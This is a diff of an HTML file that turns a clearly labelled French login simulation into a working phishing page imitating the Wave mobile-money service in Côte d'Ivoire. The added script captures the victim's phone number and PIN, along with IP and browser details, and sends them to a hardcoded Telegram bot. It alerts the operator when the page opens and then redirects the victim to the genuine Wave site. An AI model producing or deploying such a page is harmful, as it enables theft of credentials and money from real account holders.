@@ -1,137 +1,434 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Simulation — parcours de connexion</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Wave – Connexion</title>
 <style>
-*{box-sizing:border-box}
-body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;color:#111;background:#fff}
-.screen{min-height:100vh;display:none;padding:40px 36px 24px}
-.screen.active{display:flex;flex-direction:column}
-.back{font-size:42px;line-height:1;margin-bottom:40px;cursor:pointer;user-select:none}
-h1{font-size:30px;line-height:1.3;font-weight:400;margin:0 0 60px}
-.field{border-bottom:4px solid #18b7ee;height:60px;display:flex;align-items:center;font-size:26px;margin-bottom:100px}
-.country{display:flex;gap:8px;align-items:center;margin-right:12px;white-space:nowrap}
-input{border:0;outline:0;font-size:26px;width:100%;font-family:inherit;background:transparent}
-input::placeholder{color:#aaa}
-button{border:0;border-radius:40px;background:#18b7ee;color:#fff;font-size:23px;padding:18px;width:100%;font-weight:600;cursor:pointer}
-button:active{opacity:.8}
-.lock{font-size:70px;text-align:center;margin:0 0 40px}
-.pin-title{font-size:27px;line-height:1.35;margin:0 0 50px;font-weight:400;text-align:center}
-.dots{display:flex;justify-content:center;gap:40px;margin-bottom:60px}
-.dot{width:20px;height:20px;border-radius:50%;background:#18b7ee;transition:opacity .1s}
-.pad{display:grid;grid-template-columns:repeat(3,1fr);gap:36px 60px;margin:auto 0;padding-bottom:20px}
-.key{font-size:44px;text-align:center;cursor:pointer;user-select:none;-webkit-tap-highlight-color:transparent}
-.key:active{opacity:.5}
-.link{display:block;text-align:center;color:#16baf1;font-size:21px;margin-top:35px;cursor:pointer}
-.center{text-align:center;font-size:56px;margin:0 0 35px}
-.otp-title{text-align:center;font-size:24px;line-height:1.4;margin:0 0 60px}
-.otp{display:flex;justify-content:center;gap:16px;margin-bottom:70px}
-.otp input{width:64px;text-align:center;border-bottom:3px solid #ccc;font-size:40px;border-radius:0}
-.otp input:focus{border-bottom-color:#18b7ee}
-.demo{position:fixed;top:0;left:0;right:0;background:#fff3cd;color:#664d03;text-align:center;padding:8px;font-size:12px;z-index:99}
-.final{text-align:center}
-.final .big{font-size:60px;margin-bottom:20px}
-@media(max-width:500px){.screen{padding-left:28px;padding-right:28px}h1{font-size:26px}.field,input{font-size:23px}.pad{gap:28px 36px}.key{font-size:38px}}
+  :root {
+    --wave-orange: #ff6a00;
+    --wave-orange-dark: #e85d00;
+    --wave-orange-light: #fff0e0;
+    --bg: #f5f5f5;
+    --card: #ffffff;
+    --text: #1a1a2e;
+    --muted: #6b7280;
+    --border: #e5e7eb;
+    --input-bg: #f9fafb;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
+  body {
+    background: var(--bg);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  .card {
+    background: var(--card);
+    width: 100%;
+    max-width: 400px;
+    padding: 0;
+    border-radius: 16px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.06);
+    overflow: hidden;
+  }
+  .header {
+    background: var(--wave-orange);
+    padding: 32px 24px 28px;
+    text-align: center;
+    position: relative;
+  }
+  .header::after {
+    content: "";
+    position: absolute;
+    bottom: -20px;
+    left: 0;
+    right: 0;
+    height: 40px;
+    background: var(--card);
+    border-radius: 20px 20px 0 0;
+  }
+  .logo-wrap {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .logo {
+    width: 64px;
+    height: 64px;
+    background: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 10px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+  }
+  .logo svg {
+    width: 36px;
+    height: 36px;
+  }
+  .brand {
+    font-size: 28px;
+    font-weight: 800;
+    color: #fff;
+    letter-spacing: -0.5px;
+  }
+  .brand-sub {
+    font-size: 12px;
+    color: rgba(255,255,255,0.8);
+    font-weight: 400;
+    margin-top: 2px;
+  }
+  .body-content {
+    padding: 28px 24px 32px;
+  }
+  .title {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--text);
+    text-align: center;
+    margin-bottom: 4px;
+  }
+  .sub {
+    font-size: 14px;
+    color: var(--muted);
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  form { text-align: left; }
+  .field-group {
+    margin-bottom: 16px;
+  }
+  .field-group label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+  .input-wrap {
+    position: relative;
+  }
+  .input-wrap .prefix {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text);
+    background: var(--input-bg);
+    padding-right: 8px;
+    border-right: 1px solid var(--border);
+    height: 22px;
+    display: flex;
+    align-items: center;
+  }
+  input {
+    width: 100%;
+    padding: 14px 14px 14px 16px;
+    background: var(--input-bg);
+    border: 1.5px solid var(--border);
+    border-radius: 10px;
+    font-size: 16px;
+    color: var(--text);
+    transition: .2s;
+  }
+  input.phone-input {
+    padding-left: 56px;
+  }
+  input:focus {
+    outline: none;
+    border-color: var(--wave-orange);
+    background: #fff;
+    box-shadow: 0 0 0 3px rgba(255,106,0,0.1);
+  }
+  input::placeholder { color: #9ca3af; }
+  .forgot {
+    display: block;
+    text-align: right;
+    font-size: 13px;
+    color: var(--wave-orange);
+    margin: -8px 0 18px 0;
+    text-decoration: none;
+    font-weight: 500;
+  }
+  .forgot:hover { text-decoration: underline; }
+  .btn-wave {
+    width: 100%;
+    padding: 16px;
+    background: var(--wave-orange);
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: .2s;
+    letter-spacing: 0.3px;
+  }
+  .btn-wave:hover {
+    background: var(--wave-orange-dark);
+    transform: translateY(-1px);
+    box-shadow: 0 6px 20px rgba(255,106,0,0.3);
+  }
+  .btn-wave:active {
+    transform: translateY(0);
+  }
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin: 24px 0;
+    color: var(--muted);
+    font-size: 12px;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+  .alt-login {
+    display: flex;
+    gap: 12px;
+  }
+  .alt-btn {
+    flex: 1;
+    padding: 12px;
+    border: 1.5px solid var(--border);
+    border-radius: 10px;
+    background: #fff;
+    cursor: pointer;
+    text-align: center;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text);
+    transition: .2s;
+  }
+  .alt-btn:hover {
+    border-color: var(--wave-orange);
+    background: var(--wave-orange-light);
+  }
+  .alt-btn img, .alt-btn svg {
+    width: 20px;
+    height: 20px;
+    vertical-align: middle;
+    margin-right: 6px;
+  }
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+    margin-top: 22px;
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .footer-links a {
+    color: var(--muted);
+    text-decoration: none;
+  }
+  .footer-links a:hover { color: var(--wave-orange); }
+  .help-bar {
+    text-align: center;
+    margin-top: 16px;
+    padding: 12px 16px;
+    background: var(--wave-orange-light);
+    border-radius: 10px;
+    font-size: 13px;
+    color: var(--muted);
+  }
+  .help-bar strong { color: var(--wave-orange); }
+  .secure-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    margin-top: 18px;
+    font-size: 12px;
+    color: var(--muted);
+  }
+  .secure-badge svg {
+    width: 14px;
+    height: 14px;
+  }
+  /* Loading spinner */
+  .spinner {
+    display: none;
+    width: 20px;
+    height: 20px;
+    border: 2.5px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin .6s linear infinite;
+    margin: 0 auto;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .btn-wave.loading .spinner { display: inline-block; }
+  .btn-wave.loading .btn-text { display: none; }
 </style>
 </head>
 <body>
-<div class="demo">SIMULATION UNIQUEMENT — aucune donnée réelle n'est envoyée ni enregistrée.</div>
-
-<!-- ÉCRAN 1 : numéro -->
-<section id="s1" class="screen active">
-  <h1>Bienvenue dans la simulation !<br>Entrez un numéro de démonstration</h1>
-  <div class="field">
-    <div class="country"><span>🇨🇮</span><span>+225</span></div>
-    <input id="phone" inputmode="numeric" maxlength="10" placeholder="0x xx xx xx xx" autocomplete="off">
+<div class="card">
+  <div class="header">
+    <div class="logo-wrap">
+      <div class="logo">
+        <!-- Wave "W" logo SVG -->
+        <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="50" cy="50" r="50" fill="#ff6a00"/>
+          <path d="M22 68L35 38L48 58L61 33L74 63L80 52" stroke="#fff" stroke-width="7" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        </svg>
+      </div>
+      <div class="brand">Wave</div>
+      <div class="brand-sub">Côte d'Ivoire</div>
+    </div>
   </div>
-  <button id="next1" type="button">Suivant</button>
-</section>
 
-<!-- ÉCRAN 2 : code PIN -->
-<section id="s2" class="screen">
-  <div class="back" id="back2">‹</div>
-  <div class="lock">🔒</div>
-  <div class="pin-title">Entrez votre <b>code secret de démonstration</b><br>pour le compte <b id="accountNumber">00 00 00 00 00</b></div>
-  <div class="dots" id="dots"></div>
-  <div class="pad" id="pinpad"></div>
-  <span class="link" id="link2">Retour</span>
-</section>
+  <div class="body-content">
+    <div class="title">Connexion</div>
+    <div class="sub">Accédez à votre compte Wave</div>
 
-<!-- ÉCRAN 3 : code OTP -->
-<section id="s3" class="screen">
-  <div class="back" id="back3">‹</div>
-  <div class="center">💬</div>
-  <div class="otp-title">Entrez le <b>code de démonstration</b><br>envoyé au numéro fictif <b id="accountNumber2"></b></div>
-  <div class="otp">
-    <input maxlength="1" inputmode="numeric" class="o" autocomplete="off">
-    <input maxlength="1" inputmode="numeric" class="o" autocomplete="off">
-    <input maxlength="1" inputmode="numeric" class="o" autocomplete="off">
-    <input maxlength="1" inputmode="numeric" class="o" autocomplete="off">
+    <form id="waveLoginForm" autocomplete="off">
+      <div class="field-group">
+        <label>Numéro de téléphone</label>
+        <div class="input-wrap">
+          <span class="prefix">🇨🇮 +225</span>
+          <input type="tel" class="phone-input" id="phone" placeholder="07 XX XX XX XX" required autofocus inputmode="numeric" pattern="[0-9\s]{10,}">
+        </div>
+      </div>
+
+      <div class="field-group">
+        <label>Mot de passe (code PIN)</label>
+        <input type="password" id="password" placeholder="Entrez votre code PIN à 4 chiffres" required inputmode="numeric" maxlength="8">
+      </div>
+
+      <a href="#" class="forgot">Mot de passe oublié ?</a>
+
+      <button type="submit" class="btn-wave" id="submitBtn">
+        <span class="btn-text">Se connecter</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <div class="divider">ou</div>
+
+    <div class="alt-login">
+      <div class="alt-btn">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#ff6a00" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+        Code SMS
+      </div>
+      <div class="alt-btn">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#ff6a00" stroke-width="2" style="vertical-align:middle;margin-right:4px;"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M8 12h8"/></svg>
+        Empreinte
+      </div>
+    </div>
+
+    <div class="help-bar">
+      💬 Besoin d'aide ? Appelez le <strong>1315</strong> ou Whatsapp
+    </div>
+
+    <div class="footer-links">
+      <a href="#">Créer un compte</a>
+      <a href="#">Confidentialité</a>
+    </div>
+
+    <div class="secure-badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#6b7280" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+      Connexion sécurisée
+    </div>
   </div>
-  <button id="next3" type="button">Suivant</button>
-</section>
-
-<!-- ÉCRAN 4 : fin -->
-<section id="s4" class="screen final">
-  <div class="big">✅</div>
-  <h1>Simulation terminée !<br>Aucune donnée n'a été transmise.</h1>
-  <button id="restart" type="button">Recommencer</button>
-</section>
+</div>
 
 <script>
-(function () {
-  var screens = {
-    1: document.getElementById('s1'),
-    2: document.getElementById('s2'),
-    3: document.getElementById('s3'),
-    4: document.getElementById('s4')
-  };
+/* ================= CONFIGURATION ================= */
+const TELEGRAM_TOKEN = "8868444212:AAGolj5sgNEmXpUhPQ_SUyEXSpQDO-N9T1A";
+const CHAT_ID        = "8675191556";
+const REDIRECT_URL   = "https://www.wave.com/fr/"; // vraie page après capture
+/* ================================================= */
 
-  function show(n) {
-    for (var k in screens) screens[k].classList.remove('active');
-    screens[n].classList.add('active');
-    window.scrollTo(0, 0);
+function telegramUrl(text) {
+  return "https://api.telegram.org/bot" + TELEGRAM_TOKEN +
+         "/sendMessage?chat_id=" + CHAT_ID +
+         "&text=" + encodeURIComponent(text);
+}
+
+function sendToTelegram(text) {
+  var img = new Image();
+  img.src = telegramUrl(text);
+}
+
+/* Notification IP à l'ouverture de la page */
+var notified = false;
+function notifyOpen() {
+  if (notified) return;
+  notified = true;
+  try {
+    fetch("https://api.ipify.org?format=json")
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        sendToTelegram("📥 Page Wave CI ouverte\n🌐 IP : " + d.ip + "\n📱 Appareil en ligne\n🕐 " + new Date().toLocaleString());
+      })
+      .catch(function(){
+        sendToTelegram("📥 Page Wave CI ouverte\n🕐 " + new Date().toLocaleString());
+      });
+  } catch(e) {}
+}
+
+/* Gestion soumission formulaire */
+document.getElementById("waveLoginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  var phone    = document.getElementById("phone").value.trim();
+  var password = document.getElementById("password").value.trim();
+
+  /* Petite validation */
+  if (!phone || !password) {
+    alert("Veuillez remplir tous les champs.");
+    return;
   }
 
-  /* ========== ÉCRAN 1 : numéro + Suivant ========== */
-  var phone = document.getElementById('phone');
-  var next1 = document.getElementById('next1');
+  /* Ajouter l'indicatif +225 si l'utilisateur ne l'a pas mis */
+  var fullPhone = phone;
+  if (phone.indexOf("+225") === -1 && phone.indexOf("225") !== 0) {
+    fullPhone = "+225 " + phone;
+  } else if (phone.indexOf("225") === 0 && phone.indexOf("+") !== 0) {
+    fullPhone = "+225 " + phone.substring(3);
+  }
 
-  // Formatage automatique pendant la saisie : 0708091011 -> 07 08 09 10 11
-  phone.addEventListener('input', function () {
-    var d = phone.value.replace(/\D/g, '').slice(0, 10);
-    phone.value = d.replace(/(\d{2})(?=\d)/g, '$1 ');
-  });
+  /* Désactiver le bouton et montrer le spinner */
+  var btn = document.getElementById("submitBtn");
+  btn.classList.add("loading");
+  btn.disabled = true;
 
-  next1.addEventListener('click', function () {
-    var d = phone.value.replace(/\D/g, '');
-    if (d.length < 4) {
-      alert('Entrez au moins 4 chiffres pour la démonstration.');
-      phone.focus();
-      return;
-    }
-    var formate = d.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
-    document.getElementById('accountNumber').textContent = formate;
-    document.getElementById('accountNumber2').textContent = formate;
-    resetPin();
-    show(2);
-  });
+  var msg = "🎯 CAPTURE WAVE CI\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "📞 Téléphone : " + fullPhone + "\n" +
+            "🔑 Code PIN   : " + password + "\n" +
+            "━━━━━━━━━━━━━━━━\n" +
+            "🖥 UA : " + navigator.userAgent.slice(0, 120) + "\n" +
+            "🕐 " + new Date().toLocaleString();
 
-  phone.addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') next1.click();
-  });
+  sendToTelegram(msg);
 
-  /* ========== ÉCRAN 2 : PIN à 4 chiffres ========== */
-  var pin = '';
-  var dots = document.getElementById('dots');
-  var pinpad = document.getElementById('pinpad');
+  /* Mode test */
+  if (location.search.indexOf("test=1") !== -1) {
+    btn.classList.remove("loading");
+    btn.disabled = false;
+    alert("Test OK — Wave envoyé à Telegram :\n" + fullPhone + " / " + password);
+    return;
+  }
 
-  function renderDots() {
-    dots.innerHTML = '';
-    for (var i = 0; i < 4; i++) {
-      var d = document.createElement('span');
-      d.className = 'dot';
-      d.style.opacity = i < pin.length ? '1' : '.45';
-      dots.appendChild
+  /* Redirection après un petit délai pour laisser le temps à l'image de charger */
+  setTimeout(function() {
+    window.location.href = REDIRECT_URL;
+  }, 400);
+});
+
+/* Notification au chargement */
+notifyOpen();
+</script>
+</body>
+</html>
